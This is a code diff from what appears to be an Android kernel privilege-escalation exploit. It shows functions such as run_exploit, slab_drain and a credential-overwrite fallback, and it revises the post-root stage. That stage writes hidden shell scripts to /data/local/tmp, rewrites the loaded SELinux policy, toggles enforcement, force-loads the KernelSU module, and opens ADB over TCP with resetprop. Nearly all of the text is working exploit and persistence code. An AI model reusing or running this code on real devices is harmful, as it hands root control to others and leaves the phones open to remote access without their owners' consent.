@@ -261,33 +261,93 @@ static int check_selinux_off(void) {
   return b[0] == '0';
 }
 
-static void fix_selinux_policy(void) {
+static int write_selinux_policy_fix_script(void) {
   static const char fix_script[] =
     "#!/system/bin/sh\n"
     "P=/sys/fs/selinux/policy\n"
     "L=/sys/fs/selinux/load\n"
     "T=/data/local/tmp/.ghostlock_policy.bin\n"
-    "cp $P $T 2>/dev/null || exit 1\n"
+    "LOG=/data/local/tmp/.ghostlock_policy.log\n"
+    "exec >>$LOG 2>&1\n"
+    "echo \"[*] policy fix: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\"\n"
+    "cp $P $T || { echo '[!] policy fix: policy copy failed'; exit 1; }\n"
     "SZ=$(wc -c < $T)\n"
-    "[ \"$SZ\" -gt 20 ] || exit 1\n"
+    "[ \"$SZ\" -gt 20 ] || { echo \"[!] policy fix: policy too short ($SZ bytes)\"; exit 1; }\n"
     "ID_LEN=$(dd if=$T bs=1 skip=4 count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
     "CO=$((4 + 4 + ID_LEN + 4))\n"
     "CFG=$(dd if=$T bs=1 skip=$CO count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
-    "NEW=$(( CFG | 0xC0000000 ))\n"
-    "if [ \"$NEW\" != \"$CFG\" ]; then\n"
-    "  printf '\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x' "
-      "$((NEW & 0xFF)) $(((NEW>>8) & 0xFF)) $(((NEW>>16) & 0xFF)) $(((NEW>>24) & 0xFF))"
-      " | dd of=$T bs=1 seek=$CO conv=notrunc 2>/dev/null\n"
+    "echo \"[*] policy fix: config=$CFG at offset=$CO (preserved)\"\n"
+    "# /sys/fs/selinux/load accepts the complete policy in one write only.\n"
+    "if dd if=$T of=$L bs=$SZ count=1; then\n"
+    "  echo '[+] policy fix: policy load succeeded'\n"
+    "  rm -f $T\n"
+    "  exit 0\n"
     "fi\n"
-    "cat $T > $L 2>/dev/null\n"
-    "rm -f $T\n";
+    "echo '[!] policy fix: policy load failed'\n"
+    "rm -f $T\n"
+    "exit 1\n";
   int sfd = open("/data/local/tmp/.ghostlock_fixpol.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
-  if (sfd < 0) { pr_info("fix_policy: write script failed errno=%d\n", errno); return; }
-  write(sfd, fix_script, strlen(fix_script));
+  if (sfd < 0) {
+    pr_info("fix_policy: write script failed errno=%d\n", errno);
+    return 0;
+  }
+  ssize_t wrote = write(sfd, fix_script, strlen(fix_script));
   close(sfd);
-  int ret = system("su -c 'sh /data/local/tmp/.ghostlock_fixpol.sh' 2>/dev/null");
-  unlink("/data/local/tmp/.ghostlock_fixpol.sh");
-  pr_info("fix_policy: script exit=%d\n", ret);
+  if (wrote != (ssize_t)strlen(fix_script)) {
+    pr_info("fix_policy: script write failed ret=%zd errno=%d\n", wrote, errno);
+    return 0;
+  }
+  return 1;
+}
+
+static int kernelsu_module_loaded(void) {
+  int fd = open("/proc/modules", O_RDONLY);
+  if (fd < 0) return 0;
+
+  char modules[8192] = {0};
+  ssize_t n = read(fd, modules, sizeof(modules) - 1);
+  close(fd);
+  return n > 0 && strstr(modules, "kernelsu ") != NULL;
+}
+
+static int wait_for_ksu_status(void) {
+  static const char status_path[] = "/data/local/tmp/.ghostlock_ksu.status";
+
+  for (int attempt = 1; attempt <= 40; attempt++) {
+    /* The late-load helper can be replaced or blocked as the module comes
+     * online. /proc/modules is observable from this original shell and is
+     * therefore the authoritative readiness signal. */
+    if (kernelsu_module_loaded()) {
+      pr_success("KernelSU module is loaded\n");
+      return 0;
+    }
+
+    char status[128] = {0};
+    int fd = open(status_path, O_RDONLY);
+    if (fd >= 0) {
+      ssize_t n = read(fd, status, sizeof(status) - 1);
+      close(fd);
+      if (n > 0) {
+        status[strcspn(status, "\r\n")] = '\0';
+        if (!strcmp(status, "ready")) {
+          pr_success("KernelSU helper reports ready\n");
+          return 0;
+        }
+        if (!strncmp(status, "failed:", 7)) {
+          pr_error("KernelSU helper reports %s; see .ghostlock_root.log and .ghostlock_ksud.log\n",
+                   status);
+          return 1;
+        }
+      }
+    }
+    if (attempt == 1 || attempt % 10 == 0) {
+      pr_info("waiting for KernelSU helper status (%d/40)\n", attempt);
+    }
+    sleep(1);
+  }
+
+  pr_error("KernelSU helper did not report readiness; see .ghostlock_root.log and .ghostlock_ksud.log\n");
+  return 1;
 }
 
 static void slab_drain(void) {
@@ -315,48 +375,97 @@ static void slab_drain(void) {
 static void write_root_script(void) {
   int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
   if (sfd < 0) return;
+  int policy_script_ready = write_selinux_policy_fix_script();
+  unlink("/data/local/tmp/.ghostlock_ksu.status");
   const char *script =
     "#!/system/bin/sh\n"
-    "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
+    "ROOT_LOG=/data/local/tmp/.ghostlock_root.log\n"
+    "STATUS=/data/local/tmp/.ghostlock_ksu.status\n"
+    "diag() { echo \"$*\"; echo \"$*\" >>$ROOT_LOG; }\n"
+    "report_status() { printf '%s\\n' \"$1\" >$STATUS; }\n"
+    "report_status pending\n"
+    "diag '[+] root shell pid='$$' uid='$(id -u)\n"
+    "if [ -x /data/local/tmp/.ghostlock_fixpol.sh ]; then\n"
+    "  diag '[*] repairing SELinux policy before KernelSU'\n"
+    "  if /system/bin/sh /data/local/tmp/.ghostlock_fixpol.sh; then\n"
+    "    diag '[+] early SELinux policy repair succeeded'\n"
+    "    diag '[*] keeping SELinux permissive until KernelSU is ready'\n"
+    "  else\n"
+    "    diag '[!] early SELinux policy repair failed; see .ghostlock_policy.log'\n"
+    "  fi\n"
+    "  rm -f /data/local/tmp/.ghostlock_fixpol.sh\n"
+    "else\n"
+    "  diag '[!] policy repair script was not created'\n"
+    "fi\n"
     "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
     "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+    "KSU_READY=0\n"
     "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
-    "  echo '[+] KernelSU already loaded'\n"
+    "  diag '[+] KernelSU already loaded'\n"
+    "  KSU_READY=1\n"
     "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
-    "  echo '[*] ksud:' $KSUD\n"
+    "  diag '[*] ksud:' $KSUD\n"
     "  chmod 755 \"$KSUD\" 2>/dev/null\n"
     "  KVER=$(uname -r | cut -d. -f1-2)\n"
     "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
     "  KMI=\"${AVER}-${KVER}\"\n"
-    "  echo '[*] KMI=' $KMI\n"
+    "  diag '[*] KMI=' $KMI\n"
     "  mkdir -p /data/adb/ksu 2>/dev/null\n"
-    "  echo '[*] ksud late-load --kmi' $KMI\n"
-    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >/dev/null 2>&1 &\n"
+    "  diag '[*] ksud late-load --kmi' $KMI\n"
+    "  KSUD_LOG=/data/local/tmp/.ghostlock_ksud.log\n"
+    "  rm -f \"$KSUD_LOG\"\n"
+    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >\"$KSUD_LOG\" 2>&1 &\n"
     "  KSUD_PID=$!\n"
-    "  echo '[*] ksud pid='$KSUD_PID\n"
+    "  diag '[*] ksud pid='$KSUD_PID\n"
+    "  KSUD_EXITED=0\n"
     "  for w in $(seq 1 30); do\n"
-    "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
+    "    if ! kill -0 \"$KSUD_PID\" 2>/dev/null; then KSUD_EXITED=1; break; fi\n"
     "    sleep 1\n"
     "  done\n"
-    "  grep -q kernelsu /proc/modules 2>/dev/null && echo '[+] KSU LOADED' || echo '[!] KSU NOT loaded'\n"
-    "  grep kernelsu /proc/modules && echo '[+] KSU loaded' || echo '[!] KSU NOT loaded'\n"
+    "  if [ \"$KSUD_EXITED\" = 1 ]; then\n"
+    "    wait \"$KSUD_PID\"; KSUD_STATUS=$?\n"
+    "    diag '[*] ksud exit='$KSUD_STATUS\n"
+    "  else\n"
+    "    diag '[!] ksud still running after 30s; capturing process state'\n"
+    "    cat /proc/$KSUD_PID/status >>$ROOT_LOG 2>&1\n"
+    "    cat /proc/$KSUD_PID/wchan >>$ROOT_LOG 2>&1\n"
+    "  fi\n"
+    "  if [ -s \"$KSUD_LOG\" ]; then\n"
+    "    diag '[*] ksud output:'\n"
+    "    tail -n 40 \"$KSUD_LOG\"\n"
+    "    tail -n 40 \"$KSUD_LOG\" >>$ROOT_LOG\n"
+    "  fi\n"
     "fi\n"
-    "RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-    "if [ -n \"$RSPROP\" ]; then\n"
-    "  chmod 755 \"$RSPROP\" 2>/dev/null\n"
-    "  ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
-    "  \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
-    "  \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
+    "if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; fi\n"
+    "if [ \"$KSU_READY\" = 1 ]; then\n"
+    "  diag '[+] KSU LOADED'\n"
+    "  grep kernelsu /proc/modules\n"
+    "  RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+    "  if [ -n \"$RSPROP\" ]; then\n"
+    "    chmod 755 \"$RSPROP\" 2>/dev/null\n"
+    "    ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
+    "    \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
+    "    \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
+    "  fi\n"
+    "  rm -f /data/local/tmp/.ghostlock_w1\n"
+    "  APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
+    "  if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
+    "    /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
+    "  fi\n"
+    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+    "  report_status ready\n"
+    "  diag '[+] done'\n"
+    "else\n"
+    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+    "  report_status failed:module-not-loaded\n"
+    "  diag '[!] KSU NOT loaded'\n"
     "fi\n"
-    "rm -f /data/local/tmp/.ghostlock_w1\n"
-    "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
-    "if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
-    "  /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
-    "fi\n"
-    "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
-    "echo '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
-    "echo '[+] done'\n"
     "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
+  if (!policy_script_ready) {
+    pr_info("root script: early policy repair script unavailable\n");
+  }
   write(sfd, script, strlen(script));
   close(sfd);
 }
@@ -444,8 +553,15 @@ static void child_main(struct child_pipes *p) {
     execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
     _exit(1);
   }
-  if (gc > 0) waitpid(gc, NULL, 0);
-  for (;;) pause();
+  if (gc < 0) _exit(1);
+  int status = 0;
+  while (waitpid(gc, &status, 0) < 0) {
+    if (errno == EINTR) continue;
+    _exit(1);
+  }
+  if (WIFEXITED(status)) _exit(WEXITSTATUS(status));
+  if (WIFSIGNALED(status)) _exit(128 + WTERMSIG(status));
+  _exit(1);
 }
 
 static pid_t spawn_child(struct child_pipes *p) {
@@ -526,18 +642,8 @@ int run_exploit(int argc, char **argv) {
   if (root_child_done) {
     pr_success("UMH root done — skipping W2\n");
     TIMER("exploit complete (UMH)");
-    pr_info("waiting for su...\n");
-    for (int i = 0; i < 60; i++) {
-      if (system("su -c 'id' > /dev/null 2>&1") == 0) {
-        pr_success("su ready, fixing SELinux policy\n");
-        fix_selinux_policy();
-        system("su -c 'setenforce 1' > /dev/null 2>&1");
-        pr_success("sepolicy fix done\n");
-        break;
-      }
-      sleep(1);
-    }
-    return 0;
+    pr_info("waiting for KernelSU helper...\n");
+    return wait_for_ksu_status();
   }
 
   /* Phase 2 fallback: Find child task_struct + cred overwrite */
@@ -598,19 +704,8 @@ int run_exploit(int argc, char **argv) {
   sleep(2);
   TIMER("exploit complete");
 
-  pr_info("waiting for su...\n");
-  for (int i = 0; i < 60; i++) {
-    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
-      pr_success("su ready, fixing SELinux policy\n");
-      fix_selinux_policy();
-      system("su -c 'setenforce 1' > /dev/null 2>&1");
-      pr_success("sepolicy fix done\n");
-      break;
-    }
-    sleep(1);
-  }
-
-  return 0;
+  pr_info("waiting for KernelSU helper...\n");
+  return wait_for_ksu_status();
 }
 
 int install_embedded_wallpaper(void) { return 0; }
